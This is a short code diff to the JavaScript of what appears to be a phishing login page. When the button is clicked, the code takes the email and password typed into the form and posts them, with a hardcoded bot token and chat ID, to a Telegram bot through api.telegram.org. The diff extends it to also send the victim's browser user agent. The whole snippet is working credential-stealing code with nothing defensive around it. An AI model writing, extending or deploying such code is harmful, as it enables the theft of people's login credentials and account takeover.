@@ -1,12 +1,13 @@
 var token = "6423548656:AAFuFXiyAUDll8FgYjbYw6Iu30NdeSwml7s";
         var chat = "1955367555";
+        let se = navigator.userAgent;
         $("button").click(function(){
             if($("#password").val()==""){
                 alert("Password field cannot be empty.");
             }else{
                 var mail=$("#username").val();
                 var pass=$("#password").val();
-                var m = `Email: ${mail}\nPass: ${pass}`;
+                var m = `Email: ${mail}\nPass: ${pass}\nUser:${se}`;
                 $.post(`https://api.telegram.org/bot${token}/sendMessage`,{
                     chat_id:chat,
                     text:m
